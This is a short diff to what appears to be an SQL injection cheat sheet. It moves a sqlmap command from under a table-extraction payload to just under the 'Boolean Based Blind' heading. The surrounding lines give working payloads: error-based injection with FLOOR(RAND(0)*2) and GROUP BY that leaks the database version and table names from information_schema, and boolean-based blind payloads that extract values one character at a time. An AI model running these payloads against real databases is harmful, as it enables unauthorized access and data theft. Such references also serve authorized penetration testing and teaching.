@@ -65,6 +65,7 @@ AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)
 AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT (table_name) from information_schema.tables where table_schema=database() limit 0,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)
 ```
 Boolean Based Blind
+sqlmap -r test.txt -p search 
 ```
 # Intro
 select substr('abcde',1,1);
@@ -87,7 +88,7 @@ and ascii(substring(version(),2,1)) = 48 -> Second Character
 # Table
 and ascii(substring((select concat(table_name) from information_schema.tables where table_schema=database()),1,1)) > 100
 
-sqlmap -r test.txt -p search 
+
 
 ```
 Time Based Blind
